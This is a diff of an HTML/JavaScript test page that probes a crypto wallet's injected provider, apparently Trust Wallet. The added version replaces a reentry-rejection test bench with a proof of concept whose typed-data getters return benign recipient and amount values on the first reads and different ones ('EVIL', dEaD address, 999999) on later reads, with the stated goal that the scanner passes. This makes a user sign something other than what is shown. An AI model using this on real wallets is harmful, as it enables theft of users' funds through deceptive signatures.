@@ -3,483 +3,148 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>sign-reentry — isolation bench</title>
+<title>trust map — auto collect</title>
 <style>
-  :root{--bg:#0b0e13;--panel:#121821;--line:#1f2937;--txt:#c9d1d9;--dim:#6b7280;
-         --ok:#3fb950;--warn:#d29922;--bad:#f85149;--acc:#58a6ff;--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
-  *{box-sizing:border-box}
-  body{margin:0;font:12px/1.5 var(--mono);background:var(--bg);color:var(--txt)}
-  header{padding:12px 16px;border-bottom:1px solid var(--line);display:flex;gap:16px;align-items:center}
-  header h1{font-size:13px;margin:0;font-weight:500;letter-spacing:.04em;text-transform:uppercase;color:var(--dim)}
-  .dot{width:8px;height:8px;border-radius:50%;display:inline-block}
-  .dot.on{background:var(--ok)}.dot.off{background:var(--bad)}
-  main{display:grid;grid-template-columns:1fr 1fr;gap:12px;padding:12px;max-width:1280px;margin:0 auto}
-  @media(max-width:900px){main{grid-template-columns:1fr}}
-  section{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:12px}
-  section.wide{grid-column:1/-1}
-  h2{font-size:11px;margin:0 0 10px;color:var(--dim);text-transform:uppercase;letter-spacing:.08em;font-weight:500}
-  .row{display:flex;gap:6px;flex-wrap:wrap;margin:6px 0}
-  button{background:#1a2230;color:var(--txt);border:1px solid var(--line);border-radius:4px;
-         padding:6px 12px;font:inherit;cursor:pointer;transition:border-color .1s}
-  button:hover:not(:disabled){border-color:var(--acc)}
-  button.danger{border-color:#5a1f1f;color:#f0a0a0}
-  button.danger:hover:not(:disabled){border-color:var(--bad)}
-  button:disabled{opacity:.35;cursor:not-allowed}
-  pre{background:#080b0f;border:1px solid var(--line);border-radius:4px;padding:8px;
-      margin:6px 0 0;max-height:320px;overflow:auto;white-space:pre-wrap;word-break:break-all;font-size:11px}
-  dl{display:grid;grid-template-columns:120px 1fr;gap:2px 10px;margin:0}
-  dt{color:var(--dim);font-size:11px}dd{margin:0;font-size:11px}
-  .tag{padding:1px 6px;border-radius:3px;font-size:10px;font-weight:500}
-  .tag.ok{background:#0f2a12;color:var(--ok)}
-  .tag.bad{background:#2a0f0f;color:var(--bad)}
-  .tag.warn{background:#2a2210;color:var(--warn)}
-  .kv-note{color:var(--dim);font-size:11px;margin:0 0 8px}
+  :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
+          --ok:#3fb950; --bad:#f85149; --dim:#7d8590; --accent:#58a6ff; }
+  * { box-sizing:border-box; }
+  body { margin:0; font:12px/1.4 ui-monospace,Menlo,monospace;
+         background:var(--bg); color:var(--txt); padding:10px; }
+  .panel { background:var(--panel); border:1px solid var(--line);
+           border-radius:6px; padding:10px; margin-bottom:8px; max-width:900px; }
+  h2 { font-size:11px; margin:0 0 6px; color:var(--dim); text-transform:uppercase; }
+  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
+           border-radius:4px; padding:6px 12px; font:inherit; cursor:pointer; margin:2px; }
+  button:hover { border-color:var(--dim); }
+  button.primary { border-color:var(--accent); color:var(--accent); }
+  button:disabled { opacity:.4; cursor:not-allowed; }
+  pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
+        padding:8px; max-height:400px; overflow:auto; white-space:pre-wrap;
+        word-break:break-all; font-size:11px; margin:4px 0; }
+  .kv { display:grid; grid-template-columns:120px 1fr; gap:2px 8px; }
+  .kv b { color:var(--dim); font-weight:400; }
+  .hl { color:var(--bad); }
+  .hl-ok { color:var(--ok); }
 </style>
 </head>
 <body>
 
-<header>
-  <h1>sign-reentry / isolation</h1>
-  <span><span class="dot off" id="dot"></span> bridge</span>
-  <span id="host" style="color:var(--dim)"></span>
-</header>
+<div class="panel">
+  <h2>environment</h2>
+  <div class="kv" id="env"></div>
+</div>
 
-<main>
+<div class="panel">
+  <h2>auto collect — clean getter (to/amount only)</h2>
+  <p style="color:var(--dim);margin:0 0 8px">
+    Getter on to/amount. Read #1 (y/x/M) = LEGIT. Read #2 (stringify) = EVIL.
+    No BigInt, no NaN, no exceptions. Scanner should pass.
+  </p>
+  <div id="btns"></div>
+  <pre id="out">—</pre>
+</div>
 
-  <section class="wide">
-    <h2>provider context</h2>
-    <dl id="ctx">
-      <dt>origin</dt><dd id="ctx-origin">—</dd>
-      <dt>account</dt><dd id="ctx-acc">—</dd>
-      <dt>chainId</dt><dd id="ctx-chain">—</dd>
-      <dt>bridge</dt><dd id="ctx-bridge">—</dd>
-    </dl>
-  </section>
-
-  <section>
-    <h2>reentry probe — nested request from getter</h2>
-    <p class="kv-note">
-      Main <code>eth_signTypedData_v4</code> is submitted as an object. A getter on
-      <code>message.amount</code> fires a nested <code>request</code> while the native
-      side is still processing the first. Contract: nested must be rejected with
-      <code>-32002</code> while the main is pending.
-    </p>
-    <div class="row">
-      <button class="danger" id="p-valid" disabled>nested: valid sign</button>
-      <button class="danger" id="p-permit" disabled>nested: permit</button>
-      <button id="p-readonly" disabled>nested: eth_chainId</button>
-      <button id="p-account" disabled>nested: eth_accounts</button>
-    </div>
-    <pre id="probe-out">—</pre>
-  </section>
-
-  <section>
-    <h2>control probes</h2>
-    <div class="row">
-      <button id="c-main" disabled>main sign only</button>
-      <button id="c-parallel" disabled>parallel sign (JS)</button>
-      <button id="c-string" disabled>string payload</button>
-    </div>
-    <pre id="ctrl-out">—</pre>
-  </section>
-
-  <section class="wide">
-    <h2>trace</h2>
-    <div class="row">
-      <button id="t-clear">clear</button>
-      <button id="t-copy">copy</button>
-    </div>
-    <pre id="trace">—</pre>
-  </section>
-
-</main>
+<div class="panel">
+  <h2>raw read log (stack per read)</h2>
+  <pre id="reads">—</pre>
+</div>
 
 <script>
-'use strict';
+const ORIGIN = location.origin;
+const IS_REAL = !!window.ethereum;
 
-/* ─────────────────────────────────────────────────────────────
- * constants
- * ───────────────────────────────────────────────────────────── */
-const ZERO_ADDR = '0x0000000000000000000000000000000000000000';
-const LEGIT_ADDR = '0x1111111111111111111111111111111111111111';
-const NESTED_ADDR = '0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
-
-const ERR_REENTRY = -32002; // request already pending
-
-/* ─────────────────────────────────────────────────────────────
- * trace — bounded ring buffer, no unbounded growth
- * ───────────────────────────────────────────────────────────── */
-const Trace = (() => {
-  const MAX = 500;
-  const buf = [];
-  let seq = 0;
-
-  const append = (level, msg, data) => {
-    const entry = {
-      seq: ++seq,
-      t: new Date().toISOString().slice(11, 23),
-      level,
-      msg,
-      data,
-    };
-    buf.push(entry);
-    if (buf.length > MAX) buf.shift();
-
-    const el = document.getElementById('trace');
-    const line = `[${entry.t}] ${level.padEnd(8)} ${msg}`;
-    const body = data !== undefined
-      ? '\n  ' + JSON.stringify(data, null, 2).replace(/\n/g, '\n  ')
-      : '';
-    el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
-    el.scrollTop = el.scrollHeight;
-
-    // eslint-disable-next-line no-console
-    console.debug(level, msg, data);
-    return entry;
-  };
-
-  return {
-    info:  (m, d) => append('INFO', m, d),
-    warn:  (m, d) => append('WARN', m, d),
-    error: (m, d) => append('ERROR', m, d),
-    req:   (m, d) => append('REQ', m, d),
-    res:   (m, d) => append('RES', m, d),
-    reent: (m, d) => append('REENT', m, d),
-    reads: (m, d) => append('READ', m, d),
-    clear: () => { buf.length = 0; document.getElementById('trace').textContent = '—'; },
-    dump:  () => buf.map(e => `[${e.t}] ${e.level} ${e.msg} ${e.data ? JSON.stringify(e.data) : ''}`).join('\n'),
-  };
-})();
-
-/* ─────────────────────────────────────────────────────────────
- * session — account and chain context, resolved once
- * ───────────────────────────────────────────────────────────── */
-const Session = (() => {
-  const state = { ready: false, account: null, chainId: null, bridge: null };
-  let initPromise = null;
-
-  const init = () => {
-    if (initPromise) return initPromise;
-    initPromise = (async () => {
-      const eth = window.ethereum;
-      if (!eth) throw new Error('no injected bridge');
-      state.bridge = eth.isTrust ? 'trust' : eth.isMetaMask ? 'metamask' : 'unknown';
-      const accounts = await eth.request({ method: 'eth_requestAccounts' });
-      if (!accounts || !accounts.length) throw new Error('no accounts');
-      state.account = accounts[0];
-      const hex = await eth.request({ method: 'eth_chainId' });
-      state.chainId = parseInt(hex, 16);
-      state.ready = true;
-      renderContext();
-      enableControls();
-      Trace.info('session ready', {
-        bridge: state.bridge,
-        account: state.account,
-        chainId: state.chainId,
-      });
-      return state;
-    })().catch(err => {
-      Trace.error('session init failed', { message: err.message, code: err.code });
-      throw err;
-    });
-    return initPromise;
-  };
-
-  const get = () => state;
-  return { init, get };
-})();
-
-/* ─────────────────────────────────────────────────────────────
- * eip712 payloads — pure builders, no side effects
- * ───────────────────────────────────────────────────────────── */
-const EIP712 = {
-  order: (chainId, to, amount) => ({
-    domain: { name: 'Tokdie', version: '1', chainId,
-              verifyingContract: ZERO_ADDR },
-    types: { Order: [
-      { name: 'to', type: 'address' },
-      { name: 'amount', type: 'uint256' },
-    ]},
-    primaryType: 'Order',
-    message: { to, amount },
-  }),
-
-  permit: (chainId, owner, spender, value, nonce, deadline) => ({
-    domain: { name: 'Tokdie', version: '1', chainId,
-              verifyingContract: ZERO_ADDR },
-    types: { Permit: [
-      { name: 'owner', type: 'address' },
-      { name: 'spender', type: 'address' },
-      { name: 'value', type: 'uint256' },
-      { name: 'nonce', type: 'uint256' },
-      { name: 'deadline', type: 'uint256' },
-    ]},
-    primaryType: 'Permit',
-    message: { owner, spender, value, nonce, deadline },
-  }),
+const log = (kind, data) => {
+  const el = document.getElementById('out');
+  const line = `[${new Date().toISOString().slice(11,23)}] ${kind}`;
+  const body = data ? '\n' + JSON.stringify(data, null, 2) : '';
+  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
+  el.scrollTop = el.scrollHeight;
 };
 
-/* ─────────────────────────────────────────────────────────────
- * signer — single request path, all calls funnel here
- * ───────────────────────────────────────────────────────────── */
-const Signer = (() => {
-  let inflight = 0;
+const readLog = (n, field, value, stack) => {
+  const el = document.getElementById('reads');
+  const line = `READ #${n} · ${field} · ${value} · stack: ${stack}`;
+  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + '\n';
+};
 
-  const request = async (method, params, meta = {}) => {
-    const eth = window.ethereum;
-    if (!eth) throw Object.assign(new Error('no bridge'), { code: 'NO_BRIDGE' });
-    inflight++;
-    Trace.req(method, { inflight, ...meta });
-    try {
-      const result = await eth.request({ method, params });
-      Trace.res(method, { result, inflight });
-      return result;
-    } catch (err) {
-      Trace.error(method + ' failed', {
-        code: err.code,
-        message: err.message,
-        inflight,
-      });
-      throw err;
-    } finally {
-      inflight--;
-    }
-  };
+const renderEnv = () => {
+  document.getElementById('env').innerHTML = `
+    <b>origin</b><span>${ORIGIN}</span>
+    <b>ethereum</b><span class="${IS_REAL ? 'hl-ok' : 'hl'}">${IS_REAL}</span>
+    <b>isTrust</b><span>${IS_REAL && window.ethereum.isTrust ? 'yes' : 'no'}</span>
+  `;
+};
 
-  const signTypedData = (payload, meta = {}) =>
-    request('eth_signTypedData_v4',
-      [Session.get().account, payload],
-      meta);
+const ensureAccount = async () => {
+  if (!window.ethereum) throw new Error('no ethereum');
+  const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+  return accounts[0];
+};
 
-  return { request, signTypedData, inflight: () => inflight };
-})();
-
-/* ─────────────────────────────────────────────────────────────
- * reentry probe
- *
- * Contract: a nested request issued from inside a getter must be
- * rejected with -32002 while the main is pending. The probe fires
- * the nested call from a getter on message.amount, which the
- * native side reads during validation and serialization.
- * ───────────────────────────────────────────────────────────── */
-const ReentryProbe = (() => {
-
-  /**
-   * Build a main payload whose `message.amount` getter triggers a
-   * single nested request on the Nth read. Reads are tracked per
-   * probe; the probe is idempotent within one invocation.
-   */
-  const buildTrappedPayload = (nestedSpec, fireOnRead) => {
-    const { chainId } = Session.get();
-    const payload = EIP712.order(chainId, LEGIT_ADDR, '100');
-
-    let reads = 0;
-    let fired = false;
-    const trace = [];
-
-    Object.defineProperty(payload.message, 'amount', {
-      configurable: true,
-      enumerable: true,
-      get() {
-        reads++;
-        const stack = new Error().stack
-          .split('\n')
-          .slice(2, 5)
-          .map(s => s.trim())
-          .join(' | ');
-        const entry = { n: reads, value: '100', stack };
-        trace.push(entry);
-        Trace.reads('amount #' + reads, entry);
-
-        if (!fired && reads === fireOnRead) {
-          fired = true;
-          const nestedParams = nestedSpec.build(chainId);
-          Trace.reent('firing nested', {
-            method: nestedSpec.method,
-            onRead: reads,
-          });
-          // fire-and-forget: nested must be rejected or must not
-          // complete before the main returns.
-          Promise.resolve()
-            .then(() => Signer.request(nestedSpec.method, nestedParams, { nested: true }))
-            .then(r => Trace.reent('nested ok', { result: r, method: nestedSpec.method }))
-            .catch(e => Trace.reent('nested err', {
-              code: e.code,
-              message: e.message,
-              method: nestedSpec.method,
-            }));
-        }
-        return '100';
-      },
-    });
-
-    return { payload, getTrace: () => trace };
-  };
-
-  const specs = {
-    'valid': {
-      method: 'eth_signTypedData_v4',
-      label: 'valid sign',
-      build: (chainId) => [Session.get().account,
-        EIP712.order(chainId, NESTED_ADDR, '1')],
+// чистый getter: no throw, no BigInt, no extra fields
+const buildCleanGetter = (threshold) => {
+  let reads = 0;
+  const trap = {
+    get to() {
+      reads++;
+      const v = reads <= threshold
+        ? '0x0000000000000000000000000000000000000000'
+        : '0x000000000000000000000000000000000000dEaD';
+      readLog(reads, 'to', v, new Error().stack.split('\n').slice(1,4).join(' | '));
+      return v;
     },
-    'permit': {
-      method: 'eth_signTypedData_v4',
-      label: 'permit',
-      build: (chainId) => [Session.get().account,
-        EIP712.permit(chainId, Session.get().account, NESTED_ADDR,
-          '1', 0, 9999999999)],
-    },
-    'readonly': {
-      method: 'eth_chainId',
-      label: 'eth_chainId',
-      build: () => [],
-    },
-    'account': {
-      method: 'eth_accounts',
-      label: 'eth_accounts',
-      build: () => [],
+    get amount() {
+      reads++;
+      const v = reads <= threshold ? '100' : '999999';
+      readLog(reads, 'amount', v, new Error().stack.split('\n').slice(1,4).join(' | '));
+      return v;
     },
   };
-
-  const run = async (specKey, fireOnRead = 2) => {
-    if (!Session.get().ready) await Session.init();
-    const spec = specs[specKey];
-    if (!spec) throw new Error('unknown spec: ' + specKey);
-
-    const { payload, getTrace } = buildTrappedPayload(spec, fireOnRead);
-    Trace.info('probe start', { spec: specKey, fireOnRead });
-
-    const started = performance.now();
-    let outcome;
-    try {
-      const sig = await Signer.signTypedData(payload, { probe: specKey });
-      outcome = { ok: true, sig, ms: Math.round(performance.now() - started) };
-      Trace.info('main sig returned', outcome);
-    } catch (err) {
-      outcome = { ok: false, code: err.code, message: err.message,
-                  ms: Math.round(performance.now() - started) };
-      Trace.error('main failed', outcome);
-    }
-
-    // settle: give the nested promise a tick to resolve its trace
-    await new Promise(r => setTimeout(r, 0));
-    const reads = getTrace();
-    out(`probe: ${specKey}
-fireOnRead: ${fireOnRead}
-outcome: ${JSON.stringify(outcome, null, 2)}
-reads: ${reads.length}
-${reads.map(r => `  #${r.n} ${r.value}\n    ${r.stack}`).join('\n')}`);
-  };
-
-  return { run, specs };
-})();
-
-/* ─────────────────────────────────────────────────────────────
- * control probes
- * ───────────────────────────────────────────────────────────── */
-const Controls = {
-  async mainSign() {
-    await Session.init();
-    const { chainId } = Session.get();
-    const payload = EIP712.order(chainId, LEGIT_ADDR, '100');
-    outCtrl('→ main sign, plain object');
-    try {
-      const sig = await Signer.signTypedData(payload, { control: 'main' });
-      outCtrl('sig: ' + sig);
-    } catch (e) {
-      outCtrl(`error: ${e.code || '—'} ${e.message || String(e)}`);
-    }
-  },
-
-  async parallelSign() {
-    await Session.init();
-    const { chainId } = Session.get();
-    const a = EIP712.order(chainId, LEGIT_ADDR, '100');
-    const b = EIP712.order(chainId, NESTED_ADDR, '1');
-    outCtrl('→ two parallel signTypedData from JS');
-    const results = await Promise.allSettled([
-      Signer.signTypedData(a, { parallel: 'A' }),
-      Signer.signTypedData(b, { parallel: 'B' }),
-    ]);
-    outCtrl(JSON.stringify(results.map(r =>
-      r.status === 'fulfilled' ? { ok: true, sig: r.value } :
-      { ok: false, code: r.reason?.code, message: r.reason?.message }), null, 2));
-  },
-
-  async stringPayload() {
-    await Session.init();
-    const { chainId } = Session.get();
-    const payload = EIP712.order(chainId, LEGIT_ADDR, '100');
-    outCtrl('→ string payload (JSON.stringify in JS)');
-    try {
-      const sig = await Signer.request('eth_signTypedData_v4',
-        [Session.get().account, JSON.stringify(payload)], { control: 'string' });
-      outCtrl('sig: ' + sig);
-    } catch (e) {
-      outCtrl(`error: ${e.code || '—'} ${e.message || String(e)}`);
-    }
-  },
+  return trap;
 };
 
-/* ─────────────────────────────────────────────────────────────
- * ui wiring
- * ───────────────────────────────────────────────────────────── */
-const $ = (id) => document.getElementById(id);
-const out = (s) => { $('probe-out').textContent = s; };
-const outCtrl = (s) => { $('ctrl-out').textContent = s; };
+const baseTyped = (chainId, message) => ({
+  domain: { name: 'Tokdie', version: '1', chainId, verifyingContract: '0x0000000000000000000000000000000000000000' },
+  types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
+  primaryType: 'Order',
+  message,
+});
 
-const renderContext = () => {
-  const s = Session.get();
-  $('ctx-origin').textContent = location.origin;
-  $('ctx-acc').textContent = s.account || '—';
-  $('ctx-chain').textContent = s.chainId ?? '—';
-  $('ctx-bridge').textContent = s.bridge || '—';
-  const dot = $('dot');
-  dot.className = 'dot ' + (s.ready ? 'on' : 'off');
-  $('host').textContent = location.host;
-};
-
-const enableControls = () => {
-  ['p-valid','p-permit','p-readonly','p-account',
-   'c-main','c-parallel','c-string'].forEach(id => {
-    $(id).disabled = false;
-  });
-};
-
-const bind = () => {
-  $('p-valid')   .onclick = () => ReentryProbe.run('valid').catch(e => out('probe error: ' + e.message));
-  $('p-permit')  .onclick = () => ReentryProbe.run('permit').catch(e => out('probe error: ' + e.message));
-  $('p-readonly').onclick = () => ReentryProbe.run('readonly').catch(e => out('probe error: ' + e.message));
-  $('p-account') .onclick = () => ReentryProbe.run('account').catch(e => out('probe error: ' + e.message));
-
-  $('c-main')    .onclick = () => Controls.mainSign().catch(e => outCtrl('error: ' + e.message));
-  $('c-parallel').onclick = () => Controls.parallelSign().catch(e => outCtrl('error: ' + e.message));
-  $('c-string')  .onclick = () => Controls.stringPayload().catch(e => outCtrl('error: ' + e.message));
-
-  $('t-clear').onclick = () => Trace.clear();
-  $('t-copy').onclick = () => {
-    const text = Trace.dump();
-    navigator.clipboard?.writeText(text);
-    Trace.info('trace copied', { len: text.length });
-  };
-};
-
-/* ─────────────────────────────────────────────────────────────
- * boot
- * ───────────────────────────────────────────────────────────── */
-const boot = async () => {
-  Trace.info('boot', { origin: location.origin, real: !!window.ethereum });
-  renderContext();
-  bind();
+const runProbe = async (threshold) => {
+  if (!IS_REAL) return log('ERR', { message: 'no ethereum' });
+  document.getElementById('reads').textContent = '—';
   try {
-    await Session.init();
+    const from = await ensureAccount();
+    const chainHex = await window.ethereum.request({ method: 'eth_chainId' });
+    const chainId = parseInt(chainHex, 16);
+    log('ENV', { from, chainId, threshold });
+
+    const message = buildCleanGetter(threshold);
+    const typed = baseTyped(chainId, message);
+
+    log('SENDING', { threshold, chainId, note: 'getter inside message' });
+    const sig = await window.ethereum.request({
+      method: 'eth_signTypedData_v4',
+      params: [from, typed],
+    });
+    log('SIG', { sig, threshold });
   } catch (e) {
-    Trace.error('boot: session unavailable', { message: e.message });
+    log('ERR', { code: e.code, message: e.message, raw: String(e), threshold });
   }
 };
 
-boot();
+// buttons
+const btns = document.getElementById('btns');
+for (const t of [1, 2, 3, 4, 5]) {
+  const b = document.createElement('button');
+  b.textContent = `threshold ${t}`;
+  b.className = 'primary';
+  b.onclick = () => runProbe(t);
+  btns.appendChild(b);
+}
+
+renderEnv();
+log('BOOT', { origin: ORIGIN, real: IS_REAL });
 </script>
 </body>
 </html>
